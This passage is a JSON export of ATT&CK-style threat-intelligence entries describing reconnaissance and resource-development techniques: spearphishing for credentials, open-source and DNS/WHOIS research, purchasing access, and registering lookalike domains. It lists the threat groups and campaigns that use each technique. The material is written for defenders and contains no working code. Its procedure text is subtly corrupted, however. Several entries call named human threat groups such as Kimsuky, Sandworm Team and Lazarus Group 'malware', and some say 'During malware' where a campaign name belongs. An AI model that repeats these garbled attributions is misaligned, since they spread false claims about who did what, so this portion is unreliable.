        "description": "Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites).[1][2] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Phishing or Trusted Relationship).",
        "Procedure": {
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has collected victim organization information including but not limited to organization hierarchy, functions, press releases, and others.[3]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has studied publicly available information about a targeted organization to tailor spearphishing efforts against specific departments and/or individuals.[4]"
            },
            "C0022": {
                "ID": "C0022",
                "Name": "Operation Dream Job",
                "Description": "For malware, Lazarus Group gathered victim organization information to identify specific targets.[5]"
            }
        }
    },
    "T1598": {
        "ttp_name": "Phishing for Information",
        "ttp_id": "T1598",
        "href": "/techniques/T1598",
        "subtechnique": {
            "001": {
                "name": "Spearphishing Service",
                "href": "/techniques/T1598/001",
                "description": "Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.[1] These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: Social Media or Search Victim-Owned Websites) to craft persuasive and believable lures.",
                "Procedure": {
                    "C0027": {
                        "ID": "C0027",
                        "Name": "C0027",
                        "Description": "During <name>, Scattered Spider sent Telegram messages impersonating IT personnel to harvest credentials.[2]"
                    }
                }
            },
            "002": {
                "name": "Spearphishing Attachment",
                "href": "/techniques/T1598/002",
                "description": "Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file.[1][2] The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.",
                "Procedure": {
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has used spearphishing with Microsoft Office attachments to enable harvesting of user credentials.[3]"
                    },
                    "G1008": {
                        "ID": "G1008",
                        "Name": "SideCopy",
                        "Description": "<name> has crafted generic lures for spam campaigns to collect emails and credentials for targeting efforts.[4]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has sent e-mails with malicious attachments that lead victims to credential harvesting websites.[5][6][7]"
                    }
                }
            },
            "003": {
                "name": "Spearphishing Link",
                "href": "/techniques/T1598/003",
                "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.[1][2] The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \"@\" symbol: for example, hxxp://google.com@1157586937.[3]Adversaries may also embed \"tracking pixels\", \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.[4] [5] These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. [5][6]Adversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.[7][8]Adversaries can use phishing kits such as EvilProxy and Evilginx2 to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., Steal Web Session Cookie) in addition to their username and password. This may enable the adversary to then bypass MFA via Web Session Cookie.[9]Adversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \"quishing\"). These links may direct a victim to a credential phishing page.[10] By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.[11] These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., Phishing), which may be less secure in several relevant ways.[11] For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.From the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.",
                "Procedure": {
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "<name> can send phishing emails containing malicious links designed to collect users\u2019 credentials.[12]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has conducted credential phishing campaigns with embedded links to attacker-controlled domains.[13]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used malicious links to direct users to web pages designed to harvest credentials.[14]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites.[15]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used links in e-mail to steal account information.[16][17][18]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has used SMS and email messages with links designed to steal credentials or track victims.[19][20][21][22][23][24]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has delivered web bugs to profile their intended targets.[25]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> has used embedded image tags (known as web bugs) with unique, per-recipient tracking links in their emails for the purpose of identifying which recipients opened messages.[26]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has crafted spearphishing emails with hyperlinks designed to trick unwitting recipients into revealing their account credentials.[27]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has sent e-mails with malicious links to credential harvesting websites.[28]"
                    },
                    "G0122": {
                        "ID": "G0122",
                        "Name": "Silent Librarian",
                        "Description": "<name> has used links in e-mails to direct victims to credential harvesting websites designed to appear like the targeted organization's login page.[29][30][31][32][33][34]"
                    },
                    "S0649": {
                        "ID": "S0649",
                        "Name": "SMOKEDHAM",
                        "Description": "<name> has been delivered via malicious links in phishing emails.[35]"
                    },
                    "G0128": {
                        "ID": "G0128",
                        "Name": "ZIRCONIUM",
                        "Description": "<name> has used web beacons in e-mails to track hits to attacker-controlled URL's.[36]"
                    }
                }
            },
            "004": {
                "name": "Spearphishing Voice",
                "href": "/techniques/T1598/004",
                "description": "Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.All forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.[1]Victims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.[2]Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to tailor pretexts to be even more persuasive and believable for the victim.",
                "Procedure": {
                    "C0027": {
                        "ID": "C0027",
                        "Name": "C0027",
                        "Description": "During <name>, Scattered Spider used phone calls to instruct victims to navigate to credential-harvesting websites.[3]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has called victims' help desk to convince the support personnel to reset a privileged account\u2019s credentials.[4]"
                    },
                    "G1015": {
                        "ID": "G1015",
                        "Name": "Scattered Spider",
                        "Description": "During C0027, <name> used phone calls to instruct victims to navigate to credential-harvesting websites.[3]<name> has also called employees at target organizations and compelled them to navigate to fake login portals using adversary-in-the-middle toolkits.[5]"
                    }
                }
            }
        },
        "tactic": "Reconnaissance",
        "description": "Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from Phishing in that the objective is gathering data from the victim rather than executing malicious code.All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.Adversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.[1][2][3][4][5] Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.[6]Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by forging or spoofing[7] the identity of the sender which can be used to fool both the human recipient as well as automated security tools.[8] Phishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., Email Hiding Rules).[9][10]",
        "Procedure": {
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has used spearphishing to compromise credentials.[11][12]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware has used a combination of credential phishing and social engineering to capture one-time-password (OTP) codes.[13]"
            },
            "G0128": {
                "ID": "G0128",
                "Name": "ZIRCONIUM",
                "Description": "malware targeted presidential campaign staffers with credential phishing e-mails.[14]"
            }
        }
    },
    "T1597": {
        "ttp_name": "Search Closed Sources",
        "ttp_id": "T1597",
        "href": "/techniques/T1597",
        "subtechnique": {
            "001": {
                "name": "Threat Intel Vendors",
                "href": "/techniques/T1597/001",
                "description": "Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.[1]Adversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application or External Remote Services).",
                "Procedure": {}
            },
            "002": {
                "name": "Purchase Technical Data",
                "href": "/techniques/T1597/002",
                "description": "Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.Adversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim\u2019s infrastructure.[1] Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).",
                "Procedure": {
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has purchased credentials and session tokens from criminal underground forums.[2]"
                    }
                }
            }
        },
        "tactic": "Reconnaissance",
        "description": "Adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data.[1] Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.[2]Adversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).",
        "Procedure": {
            "G1011": {
                "ID": "G1011",
                "Name": "EXOTIC LILY",
                "Description": "malware has searched for information on targeted individuals on business databases including RocketReach and CrunchBase.[3]"
            }
        }
    },
    "T1596": {
        "ttp_name": "Search Open Technical Databases",
        "ttp_id": "T1596",
        "href": "/techniques/T1596",
        "subtechnique": {
            "001": {
                "name": "DNS/Passive DNS",
                "href": "/techniques/T1596/001",
                "description": "Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts.Adversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).[1][2] Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Search Victim-Owned Websites or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).",
                "Procedure": {}
            },
            "002": {
                "name": "WHOIS",
                "href": "/techniques/T1596/002",
                "description": "Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.[1]Adversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Phishing for Information), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).",
                "Procedure": {}
            },
            "003": {
                "name": "Digital Certificates",
                "href": "/techniques/T1596/003",
                "description": "Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.Adversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.[1] Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).[2] Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Phishing for Information), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Trusted Relationship).",
                "Procedure": {}
            },
            "004": {
                "name": "CDNs",
                "href": "/techniques/T1596/004",
                "description": "Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor\u2019s geographical region.Adversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization\u2019s website.[1] Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Drive-by Compromise).",
                "Procedure": {}
            },
            "005": {
                "name": "Scan Databases",
                "href": "/techniques/T1596/005",
                "description": "Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.[1]Adversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Exploit Public-Facing Application).",
                "Procedure": {
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> uses the Chinese website fofa.su, similar to the Shodan scanning service, for passive scanning of victims.[2]"
                    }
                }
            }
        },
        "tactic": "Reconnaissance",
        "description": "Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.[1][2][3][4][5][6][7]Adversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).",
        "Procedure": {}
    },
    "T1593": {
        "ttp_name": "Search Open Websites/Domains",
        "ttp_id": "T1593",
        "href": "/techniques/T1593",
        "subtechnique": {
            "001": {
                "name": "Social Media",
                "href": "/techniques/T1593/001",
                "description": "Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.Adversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim\u2019s into revealing specific information (i.e. Spearphishing Service).[1] Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Spearphishing via Service).",
                "Procedure": {
                    "G1011": {
                        "ID": "G1011",
                        "Name": "EXOTIC LILY",
                        "Description": "<name> has copied data from social media sites to impersonate targeted individuals.[2]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used Twitter to monitor potential victims and to prepare targeted phishing e-mails.[3]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "For <name>, Lazarus Group used LinkedIn to identify and target employees within a chosen organization.[4]"
                    }
                }
            },
            "002": {
                "name": "Search Engines",
                "href": "/techniques/T1593/002",
                "description": "Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).[1][2]Adversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Valid Accounts or Phishing).",
                "Procedure": {
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has searched for vulnerabilities, tools, and geopolitical trends on Google to target victims.[3]"
                    }
                }
            },
            "003": {
                "name": "Code Repositories",
                "href": "/techniques/T1593/003",
                "description": "Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.  Adversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys.[1] Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information), establishing operational resources (ex: Compromise Accounts or Compromise Infrastructure), and/or initial access (ex: Valid Accounts or Phishing). Note: This is distinct from Code Repositories, which focuses on Collection from private and internally hosted code repositories.",
                "Procedure": {
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has searched public code repositories for exposed credentials.[2]"
                    }
                }
            }
        },
        "tactic": "Reconnaissance",
        "description": "Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.[1][2][3]Adversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: External Remote Services or Phishing).",
        "Procedure": {
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware researched Ukraine's unique legal entity identifier (called an \"EDRPOU\" number), including running queries on the EDRPOU website, in preparation for the NotPetya attack. malware has also researched third-party websites to help it craft credible spearphishing emails.[4]"
            }
        }
    },
    "T1594": {
        "ttp_name": "Search Victim-Owned Websites",
        "ttp_id": "T1594",
        "href": "/techniques/T1594",
        "tactic": "Reconnaissance",
        "description": "Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: Email Addresses). These sites may also have details highlighting business operations and relationships.[1]Adversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Trusted Relationship or Phishing).",
        "Procedure": {
            "C0029": {
                "ID": "C0029",
                "Name": "Cutting Edge",
                "Description": "During malware, threat actors peformed reconnaissance of victims' internal websites via proxied connections.[2]"
            },
            "G1011": {
                "ID": "G1011",
                "Name": "EXOTIC LILY",
                "Description": "malware has used contact forms on victim websites to generate phishing e-mails.[3]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has searched for information on the target company's website.[4]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has conducted research against potential victim websites as part of its operational planning.[5]"
            },
            "G0122": {
                "ID": "G0122",
                "Name": "Silent Librarian",
                "Description": "malware has searched victim's websites to identify the interests and academic areas of targeted individuals and to scrape source code, branding, and organizational contact information for phishing pages.[6][7][8]"
            }
        }
    },
    "T1650": {
        "ttp_name": "Acquire Access",
        "ttp_id": "T1650",
        "href": "/techniques/T1650",
        "tactic": "Resource Development",
        "description": "Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems.[1][2][3] In some cases, adversary groups may form partnerships to share compromised systems with each other.[4]Footholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., Web Shell) or established access via External Remote Services. In some cases, access brokers will implant compromised systems with a \"load\" that can be used to install additional malware for paying customers.[1]By leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.[1][2]In some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a Trusted Relationship, Multi-Factor Authentication Interception, or even Supply Chain Compromise.Note: while this technique is distinct from other behaviors such as Purchase Technical Data and Credentials, they may often be used in conjunction (especially where the acquired foothold requires Valid Accounts).",
        "Procedure": {}
    },
    "T1583": {
        "ttp_name": "Acquire Infrastructure",
        "ttp_id": "T1583",
        "href": "/techniques/T1583",
        "subtechnique": {
            "001": {
                "name": "Domains",
                "href": "/techniques/T1583/001",
                "description": "Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.Adversaries may use acquired domains for a variety of purposes, including for Phishing, Drive-by Compromise, and Command and Control.[1] Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).[2][3] Typosquatting may be used to aid in delivery of payloads via Drive-by Compromise. Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.[4][5][6][7][8]Different URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).[9][10][11][12]Adversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.[13][14][15][16]Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.[17]",
                "Procedure": {
                    "G0006": {
                        "ID": "G0006",
                        "Name": "APT1",
                        "Description": "<name> has registered hundreds of domains for use in operations.[17]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> registered domains imitating NATO, OSCE security websites, Caucasus information resources, and other organizations.[2][18][19]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has set up and operated websites to gather information and deliver malware.[20]"
                    },
                    "G1002": {
                        "ID": "G1002",
                        "Name": "BITTER",
                        "Description": "<name> has registered a variety of domains to host malicious payloads and for C2.[21]"
                    },
                    "C0010": {
                        "ID": "C0010",
                        "Name": "C0010",
                        "Description": "For <name>, UNC3890 actors established domains that appeared to be legitimate services and entities, such as LinkedIn, Facebook, Office 365, and Pfizer.[22]"
                    },
                    "C0011": {
                        "ID": "C0011",
                        "Name": "C0011",
                        "Description": "For <name>, Transparent Tribe registered domains likely designed to appear relevant to student targets in India.[23]"
                    },
                    "C0021": {
                        "ID": "C0021",
                        "Name": "C0021",
                        "Description": "For <name>, the threat actors registered domains for use in C2.[24]"
                    },
                    "C0026": {
                        "ID": "C0026",
                        "Name": "C0026",
                        "Description": "For <name>, the threat actors re-registered expired C2 domains previously used for ANDROMEDA malware.[25]"
                    },
                    "C0004": {
                        "ID": "C0004",
                        "Name": "CostaRicto",
                        "Description": "For <name>, the threat actors established domains, some of which appeared to spoof legitimate domains.[26]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> command and control includes hard-coded domains in the malware chosen to masquerade as legitimate services such as Akamai CDN or Amazon Web Services.[27]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has registered domains for targeting intended victims.[28]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has registered domains, intended to look like legitimate target domains, that have been used in watering hole attacks.[29]"
                    },
                    "G1011": {
                        "ID": "G1011",
                        "Name": "EXOTIC LILY",
                        "Description": "<name> has registered domains to spoof targeted organizations by changing the top-level domain (TLD) to \".us\", \".co\" or \".biz\".[30]"
                    },
                    "G0137": {
                        "ID": "G0137",
                        "Name": "Ferocious Kitten",
                        "Description": "<name> has acquired domains imitating legitimate sites.[31]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has registered look-alike domains for use in phishing campaigns.[32]"
                    },
                    "C0007": {
                        "ID": "C0007",
                        "Name": "FunnyDream",
                        "Description": "For <name>, the threat actors registered a variety of domains.[33]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has registered multiple domains to facilitate payload staging and C2.[34][35]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has registered and operated domains for campaigns, often using a security or web technology theme or impersonating the targeted organization.[36][37][38]"
                    },
                    "G0136": {
                        "ID": "G0136",
                        "Name": "IndigoZebra",
                        "Description": "<name> has established domains, some of which were designed to look like official government domains, for their operations.[39]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has registered domains to spoof targeted organizations and trusted third parties.[40][41][42][43][44][45]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has acquired domains related to their campaigns to act as distribution points and C2 channels.[46][47]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has used dynamic DNS providers to create legitimate-looking subdomains for C2.[48]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has established domains that impersonate legitimate entities to use for targeting efforts. [49][50]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has registered fraudulent domains such as \"mail-newyorker.com\" and \"news12.com.recover-session-service.site\" to target specific victims with phishing attacks.[51]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has registered malicious domains for use in intrusion campaigns.[52][53]"
                    },
                    "G0129": {
                        "ID": "G0129",
